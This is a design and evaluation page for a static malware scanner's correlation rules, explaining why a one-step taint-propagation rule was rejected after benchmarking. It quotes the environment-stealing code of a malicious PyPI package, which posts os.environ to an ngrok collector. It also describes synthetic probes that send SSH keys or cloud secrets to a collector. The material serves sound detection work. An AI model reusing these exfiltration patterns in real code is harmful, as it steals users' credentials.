# Correlation chains: which names link, and the propagation step not taken

A correlation chain (`correlation_rules` in `cli/packs/core/v1/*.json`,
applied by `cli/src/scanner/correlate.rs::apply`) links a *source* finding to
a *sink* finding when the source line binds a name and the sink's argument
window uses it. This page covers two decisions about that link:

1. **Names are read as values.** Every built-in chain sets
   `"name_uses": "value"`. A keyword argument's name, an assignment target or
   an object key that only *repeats* the bound name does not link.
2. **One propagation step was measured and not adopted.** Under that step, a
   line between source and sink of the form `new = <expression using the bound
   name>` would bind `new` too. It would win back the one family that (1)
   costs, but it changes no real verdict except through a wrong link. On
   constructed clean code, it reports CRITICAL RISK for the most ordinary
   uses of a credential. The cost of (1) stays pinned by
   `exfil_chain_does_not_follow_a_two_hop_flow` in `cli/src/corpus/engine.rs`.

```
Data Source: Real samples, all static scans (nothing executed):
             - Datadog malicious-software-packages-dataset, commit 1dbcfc517277f3e3d32434f8f6a82e6e9fb75580,
               scripts/run_eval.py's selection (--limit 204: 844 npm/PyPI/ai-skills packages,
               fingerprint 63fcde5b...), offline phases.
             - 204 malicious skills (the same dataset's ai-skills bucket) and 455 clean vendor skills
               (anthropics/skills 3337550, NVIDIA/skills 0f72c29b, openai/skills 49f948f,
               vercel-labs/agent-skills 063bee9), scripts/benchmark_skills.py.
             - 169 clean MCP servers (evaluation_results/corpora/mcp_clean_manifest.json, sha256-verified).
             - 157 popular MCP servers: the reconstruction of the out-of-sample holdout in
               evaluation_results/corpora/mcp_holdout_manifest.json (docs/detection/source-map-correlation.md);
               NOT the original 146.
             Synthetic: 14 constructed probe files (below), labelled as such wherever they are counted.
Sample Size: 844 Datadog packages (their ai-skills bucket is the 204 malicious skills, also scanned
             with benchmark_skills.py), 455 clean skills, 169 + 157 MCP servers: 1,625 distinct real
             samples. 14 synthetic probes.
Limitations: The clean corpora gave the step few chances: 37 source/sink pairs in 18 of 781 clean
             samples. Zero changes there is weak evidence of safety, and the probes carry most of the
             false-positive argument. "Clean" means published, not audited. The holdout is a
             re-selection, not the sample the earlier holdout figures came from. The restricted
             variant C was designed after seeing the first probes, so its figures on them are in-sample.
             The name_uses baseline is a reconstruction (see "Provenance").
```

## Provenance of the baseline

The change that introduced `name_uses` was built on a branch, `ws/exfilchain`,
whose commits were not pushed anywhere this measurement could reach. It is
re-implemented here from its description:

- the `name_uses` field (`word`, the default, or `value`);
- `value` on every built-in chain;
- the corpus digest covering `name_uses`;
- the test that pins its cost.

The reconstruction reproduces that branch's recorded measurement exactly.
Against the cff3fa2 release build, 17 Datadog samples lose EXFIL-CHAIN-001,
all versions of one PyPI family, `artifact-lab-3-package`, and none changes
max severity. The constructed variant with an ordinary host goes from
CRITICAL RISK (cff3fa2) to LOW RISK. If the original commits land first, they
replace the reconstruction commit; the rest of this change does not depend on
which one ships.

The corpora were rebuilt from their public sources and checked against the
recorded runs before anything was compared:

| Corpus | Check | Result |
|---|---|---|
| Datadog 844 | `run_eval.dataset_fingerprint` | `63fcde5b…`, identical; recall 785 / 761 / 752 / 561 at any / Med / High / Crit, identical to [the recorded run](../../evaluation_results/honest_detection_eval_7826ea1.md); cff3fa2 and head (ef0b95f) per-sample identical to each other |
| Skills 659 | head's per-sample level, rule set, finding count vs `evaluation_results/skills_benchmark/sigil_tls.json` | 659 of 659 identical |
| MCP clean 169 | archive sha256 (manifest); head per-sample vs `mcp_sigil_tls.json` | 169 of 169 identical |
| MCP holdout 157 | archive sha256 (`mcp_holdout_manifest.json`, the reconstruction #170 published) | rebuilt 157 of 157 |

## What reading names as values changed

The motivating case is a clean health check that was reported CRITICAL RISK:

```python
url = os.environ["DATABASE_URL"]          # CRED-001 binds `url`
base = "https://status.example.com"
resp = requests.get(url=base + "/ping")   # the keyword `url=` "used" it
```

Measured, head (ef0b95f, the base of this change) → `name_uses: value`:

| Corpus | Level changes | Chain changes |
|---|---:|---|
| Datadog 844 | 0 (recall 785 / 761 / 752 / 561 both) | EXFIL-CHAIN-001 lost on 17 samples, gained on 0 |
| Skills 204 malicious + 455 clean | 0 | 0 |
| MCP clean 169 | 0 | 0 |
| MCP holdout 157 | 0 | 0 |

The 17 are all `artifact-lab-3-package`: versions 0.1.2; -153c1c1a,
-1f7a39bc, -2387a34d, -34b21b63, -3ccf47e8, -438d82fc, -77d0c154,
-b55680cd, -db7d716a and -e46d5661 at 0.1.1 or 0.1.2; -4c04b1a2 at 0.1.1,
0.3, 0.5, 1.0.1 and 1.0.3; and -a18ff5d9 1.1.5. Each does this, in
`setup.py` or `artifact_lab_leak.py`:

```python
data = dict(os.environ)                               # CRED-ENV-001 binds `data`
encoded_data = urllib.parse.urlencode(data).encode()
url = 'https://….ngrok.app/collect'                   # NET-007 (Critical): the sink line
req = urllib.request.Request(url, data=encoded_data)  # the keyword `data=` was the old link
```

The old link was a coincidence of names. The same code with the copy called
`env` never linked, and the real flow is two hops. All 17 stay CRITICAL RISK:
NET-007 is Critical on the collector URL, and 16 of the 17 also have the
Critical install hook INSTALL-001.

### Found in review: Python braces

The value reading treated every bare `name:` after `{` or `,` as an object
key. In JavaScript that is right: `{ token: "public" }` names a property.
In Python it is wrong. A bare name inside `{...}` is evaluated, as a dict
key, a set element or an f-string field. So `json={token: "stolen"}` sends
the credential, and `data=f"{token:>40}"` formats it into the body.

Both were CRITICAL RISK on head and LOW RISK on the first build of this
change. In a Python file, a bare name whose innermost open bracket is `{`
is now read as a value. Quoted keys, keyword arguments and annotations
(`def send(token: str)`) are still names. The language comes from the sink
file's extension (`.py`, `.pyw`, `.pyi`). Every other file keeps the key
reading, including a Python snippet inside Markdown.

| Probe (synthetic) | head | name_uses, first build | shipped |
|---|---|---|---|
| Python `requests.post(u, json={token: "stolen"})` | CRITICAL | LOW | CRITICAL |
| Python `requests.post(u, data=f"{token:>40}")` | CRITICAL | LOW | CRITICAL |
| JS `fetch(u, { body: JSON.stringify({ token: "public" }) })` | CRITICAL | LOW | LOW |

Measured, the first build → shipped: no sample changed on any corpus.
There were 0 level, rule-set or finding-count changes on the skills, clean
MCP and holdout corpora. On Datadog, recall and every chain were identical.
No sample in these corpora sends a credential this way, so the fix restores
detection only of shapes like the probes. B and C below were measured on the
first build; the fix touches neither the step nor any sample they changed.
The fix as shipped reads the brackets in one pass over the window, so one
long line cannot make it quadratic. It was re-run against the version
measured above on every corpus, with identical results.

## The propagation step

A line strictly between the source and the sink (so within `window_lines`),
of the form `new = <expression that uses a bound name as a value>`, also binds
`new`. It is one step only: `new` is not followed further. Two variants were
built as a per-rule setting, `follow_assignment`, and switched on for
EXFIL-CHAIN-001, AGENTSC-CHAIN-001, AGENTSC-CHAIN-002 and DESER-CHAIN-001:

- **B**, the step as stated: [`follow_assignment.patch`](../../evaluation_results/correlation_step/follow_assignment.patch).
- **C**, the same step, with a derived name linking only where it is used
  bare, not through `.attribute` or `.method()`:
  [`follow_assignment_bare.patch`](../../evaluation_results/correlation_step/follow_assignment_bare.patch).
  C was written after the first round of probes. It is the obvious
  restriction those false positives suggest, which is why the second round
  exists.

Neither patch ships. A linked chain names the hop in its snippet
(`CRED-ENV-001 (@L6) reaches NET-007 (@L8) via encoded_data (@L7)`).

### Probes (synthetic)

Each probe is a real `sigil scan` of one constructed file. Verdicts are
listed; `*` marks a file where a chain fired.

| Probe | Shape | name_uses (shipped) | B | C |
|---|---|---|---|---|
| clean p1 | `token` → `client = Client(token)` → `post(STATUS_URL, json={"status": client.status})` | LOW | CRITICAL* | LOW |
| clean p2 | DB URL → `engine = create_engine(url)` → unrelated `requests.get(...)`; `engine.connect()` on the next line | LOW | CRITICAL* | LOW |
| clean p3 | as p2, `engine` next used 6 lines below the request | LOW | LOW | LOW |
| clean p4 | `password` → `conn = psycopg2.connect(..., password=password)` → `post(REPORT, json={"open": conn.closed == 0})` | LOW | CRITICAL* | LOW |
| clean p5 | JS `apiKey` → `new OpenAI({ apiKey })` → `fetch(".../event", { body: … openai.baseURL })` | LOW | CRITICAL* | LOW |
| clean p6 | `token` → `gh = Github(token)` → `repo = gh.get_repo(...)` → `post(..., json={"repo": repo.full_name})` (two steps) | LOW | LOW | LOW |
| clean p7 | refresh token → `body = {"grant_type": ..., "refresh_token": refresh}` → `post(TOKEN_URL, data=body)` | LOW | CRITICAL* | CRITICAL* |
| clean p8 | webhook secret → `signature = hmac.new(secret…).hexdigest()` → `post(hook, json={..., "signature": signature})` | LOW | CRITICAL* | CRITICAL* |
| clean p9 | private key → `assertion = jwt.encode(..., private_key)` → `post(token_uri, data={..., "assertion": assertion})` | LOW | LOW † | LOW † |
| clean p10 | API key → `hint = key[:4] + "****"` → `post(audit, json={"key_hint": hint})` | LOW | CRITICAL* | CRITICAL* |
| malicious t1 | the artifact-lab shape, tunnel URL | CRITICAL | CRITICAL* | CRITICAL* |
| malicious t2 | t1 with an ordinary host and `requests.post(host, data=encoded_data)` | LOW | CRITICAL* | CRITICAL* |
| malicious t3 | `with open("~/.ssh/id_rsa") as fh:` → `content = fh.read()` → `post(collector, data=content)` | CRITICAL | CRITICAL* | CRITICAL* |
| malicious t4 | JS AWS secret → `body = JSON.stringify({ key, ... })` → `fetch(collector, { body })` | LOW | CRITICAL* | CRITICAL* |

† p9 does not link only because `jwt-bearer` in the grant type contains
`bearer`, one of EXFIL-CHAIN-001's `sink_excludes`. That is a coincidence,
not a judgement about JWTs.

Of the 10 clean shapes, B reports 7 CRITICAL RISK and C reports 3. Of the 4
malicious shapes, both link all 4. Only t2 and t4 change verdict; the other
two are CRITICAL RISK without the step.

One more comparison for fairness: the *one-hop* form of p7,
`requests.post(TOKEN_URL, data={"refresh_token": refresh})`, is already
CRITICAL RISK on the shipped engine and on head. EXFIL-CHAIN-001 cannot tell
a credential sent to its own token endpoint from one sent to a collector.
The step would extend that existing false-positive class to anything derived
from the credential, one assignment away.

### Real corpora

Measured, `name_uses` (shipped) → B → C. Each row compares one build with the
build to its left.

| Corpus | B: level changes | B: chain changes | C: level changes | C: chain changes |
|---|---|---|---|---|
| Datadog 844 | 1: mistralai 2.4.6, High → Critical (HIGH RISK → CRITICAL RISK) | EXFIL-CHAIN-001 +18 (the 17 artifact-lab samples, and mistralai), −0 | 1 against B: mistralai back to High; 0 against the shipped engine | against the shipped engine: EXFIL-CHAIN-001 +17 (artifact-lab), −0 |
| Skills 204 + 455 | 0 | 0 | 0 | 0 |
| MCP clean 169 | 0 | 0 | 0 | 0 |
| MCP holdout 157 | 0 | 0 | 0 | 0 |

No other chain changed in any build: AGENTSC-CHAIN-002, DESER-CHAIN-001,
DROPPER-CHAIN-001 and TLS-CHAIN-001 fire on the same Datadog samples
throughout. EXFIL-CHAIN-001 fires on 40 Datadog samples at head, 23 with
`name_uses: value`, 41 with B and 40 with C. Recall at ≥ Critical is 561 for
every build except B's 562; every other threshold is identical everywhere.

**Every one of the 18 links B adds was read.** 17 are the artifact-lab flow
(CRED-ENV-001 → NET-007 via `encoded_data`). The 18th is in
`pypi/compromised_lib/mistralai/2.4.6`, and it is wrong. It links the SDK's
own example, `examples/mistral/ocr/ocr_process_from_file.py`:

```python
api_key = os.environ["MISTRAL_API_KEY"]                                  # L12 CRED-001
client = Mistral(api_key=api_key)                                        # L13 the step binds `client`
...
urllib.request.urlretrieve(MIXTRAL_OF_EXPERTS_PDF_URL, MOE_FILENAME)     # L18 NET-002: an arXiv PDF
...
uploaded_file = client.files.upload(                                     # L21, inside the sink's window
```

The key does not reach the PDF download. The sink's five-line window happens
to contain the next use of the client. This is probe p1's shape in published
code, and it is the only real verdict B changes. Recall counts it as a gain at
≥ Critical, but the sample is malicious for other reasons (a compromised
release), and the chain it now carries is false.

**Exposure.** A zero on the clean corpora is only as good as the chances the
step had. Across the 781 clean samples, 18 samples hold a source/sink pair
EXFIL-CHAIN-001 could consider (CRED-* source, network sink, same file,
source first, within 20 lines): 37 pairs in all. None links, directly or
through the step. The clean MCP servers are mostly TypeScript calling
`fetch(url)` with a variable, which the network sink rules do not match.
That is why so few pairs exist, not evidence that derived-value sends are
rare in clean code.

Three Datadog samples, two `@asyncapi/studio` releases and one
`@automagik/genie` release, hit the 30-second per-file budget
(PROV-BUDGET-001) in some runs and not others, depending on machine load.
In the committed run, the `name_uses` build hit it on all three. So
`datadog.json` shows two extra chain changes there, OBFUSC-CHAIN-006
instances in a bundled `page.js` and an EXFIL-CHAIN-001 in `dist/genie.js`,
lost in that build and back in the next. Both are marked `budget_expired`.

Rescanned with every build and the budget off (`SIGIL_FILE_BUDGET_SECS=0`),
the three samples' chain findings are identical across all four builds. All
three are CRITICAL RISK in every run. The counts in this page leave those
two out.

## Confirmed on the merged base

#169 was merged onto a base that also carries #170, under which source maps
are no longer correlated. The shipped tree is that base plus #169 and the
Python-braces fix. It was measured against the base alone (09d9fae), and the
result is the same as the head → `name_uses` comparison above:

- **Datadog:** the same 17 `artifact-lab-3-package` samples lose
  EXFIL-CHAIN-001, and nothing else changes. Recall is 785 / 761 / 752 / 561
  on both builds, with 0 severity or verdict changes and no sample over the
  time budget.
- **Skills (659), clean MCP (169) and the 157-server holdout:** 0 level,
  rule-set or finding-count changes.

On the holdout, head → base reproduces #170's own result: two
DROPPER-CHAIN-001 removals (`com.vibgrate/ai-context`,
`dev.jasonpearson/auto-mobile`) and nothing else.

## Decision

The step is not adopted, in either form, and the cost of reading names as
values stays pinned.

- **No measured benefit.** Across the 1,625 distinct real samples (the 204
  malicious skills are the Datadog selection's ai-skills bucket, scanned a
  second way), the step changed one verdict, through a false link. The 17
  samples it restores are CRITICAL RISK without it. The cases it would
  really fix are t2 (the artifact-lab flow with an ordinary host and no
  install hook) and t4. Both are constructed; no sample in these corpora
  has either shape.
- **Its cost is the ordinary use of a credential.** A client, an engine, a
  connection, a signature, a token-endpoint body or a key hint is built from
  a credential and then used near a request. B turns 7 of the 10 clean
  probes into CRITICAL RISK, and one of them turned up in published code
  (mistralai). C removes the object shapes it was designed on, but it still
  links a signature, a refresh body and a key hint. Each of those is a value
  derived from the secret, sent where it is meant to go.
- **The gap is not closable by a text rule.** Whether `new = f(secret)`
  still carries the secret depends on `f`: `urlencode` and `read` keep it;
  `hmac.new`, a slice or a client constructor do not, or not in a form
  that matters. Each restriction that removes one false-positive class is
  another entry in a table of which functions propagate and which sanitise.
  That is taint analysis, built one exception at a time.

### Behind a per-rule setting?

If it is ever adopted, yes: a per-rule `follow_assignment`, off by default,
as it was built here. Its precision depends on the source more than on the
sink. A whole-environment copy (`dict(os.environ)`, CRED-ENV-001) has no
legitimate derived form that belongs in a request body. A single token's
derived forms (clients, signatures) are how tokens are used.

The narrowest defensible form is therefore a chain whose source is
CRED-ENV-001 alone, with the step on. On these corpora that form links
exactly B's step links whose source is CRED-ENV-001. This is read from B's
per-link records (each chain snippet names its source), not from a separate
build:

- It keeps the 17 artifact-lab chains.
- It drops the mistralai link (CRED-001).
- On the probes, it links t1 and t2, none of the ten clean shapes, and not
  t3 (CRED-005) or t4 (CRED-002).

It too changes no real verdict. It is the form to build if a real sample
turns up where a two-hop environment send is the only thing between a
package and a LOW RISK verdict.

### ADR-0005

[ADR-0005](../adr/ADR-0005-signed-declarative-signature-packs.md) keeps the
detection corpus declarative and the engine free of user code, and it
accepts that "declarative rules cannot express taint flows". Correlation
lives inside that trade because it is a *text identity check*: the name the
source line binds is the name the sink uses.

One propagation step is the first transfer function of a taint analysis,
`x = f(y)` ⇒ `taint(x) ⊇ taint(y)`, bounded to depth one and to the chain's
window. It would still be engine code switched by a declarative flag, and no
user code would run, so it does not break the ADR's execution rule. It does
cross the line the ADR accepted. The link would no longer be "the same name"
but "something computed from it", and the measurements above show that its
precision then rests on knowing which `f` keep the secret: knowledge the
text does not carry.

Within ADR-0005, two-hop flows are out of scope for the declarative
correlation pass. If they need covering, it is through the ADR's own
escalation path, a separate ADR for a real analysis, not a growing list of
regex exceptions.

## Reproducing

```bash
# Corpora (see the table under "Provenance" for the pins)
python3 evaluation_results/corpora/fetch_mcp_clean.py --out /data/mcp_clean \
    --from-manifest evaluation_results/corpora/mcp_clean_manifest.json
python3 evaluation_results/corpora/fetch_mcp_clean.py --out /data/mcp_holdout \
    --from-manifest evaluation_results/corpora/mcp_holdout_manifest.json

# The experiment builds: apply a patch to fa601b8 (the tree B and C were
# measured on, before the Python-braces fix), then `cargo build --release`
git checkout fa601b8
git apply evaluation_results/correlation_step/follow_assignment.patch        # B
git apply evaluation_results/correlation_step/follow_assignment_bare.patch   # C, on top of B

# Skills and MCP servers, once per build
SIGIL_BIN=/path/to/build python3 scripts/benchmark_skills.py --tools sigil \
    --clean /data/mcp_clean --clean-sample-depth 1 --out out/mcp_clean
SIGIL_BIN=/path/to/build python3 scripts/benchmark_skills.py --tools sigil \
    --malicious /data/mal_skills --sample-depth 2 \
    --clean /data/anthropics_skills --clean /data/NVIDIA_skills \
    --clean /data/openai_skills --clean /data/vercel-labs_agent-skills --out out/skills

# Datadog, per sample, on run_eval.py's own selection, extraction and scan
python3 scripts/datadog_diff.py --dataset-path /data/malicious-software-packages-dataset \
    --limit 204 --work /data/dd-work \
    --expect-fingerprint 63fcde5babebf27dfb47833749a0a987c24e2bffd0228a412dd4910ebda73ade \
    --build head=/path/to/head --build name_uses=/path/to/fa601b8 \
    --build follow_assignment=/path/to/B --build follow_assignment_bare=/path/to/C \
    --out out/datadog
```

`mal_skills` is the dataset's `samples/ai-skills/malicious_intent/*/*.zip`,
each extracted with `run_eval.extract_zip` into
`mal_skills/malicious_intent/<sample>/`. The per-sample results are in
[`evaluation_results/correlation_step/`](../../evaluation_results/correlation_step/):

- `benchmarks.json` has every skills and MCP outcome.
- `datadog.json` has the Datadog recall, and every severity, verdict and
  chain change between consecutive builds.
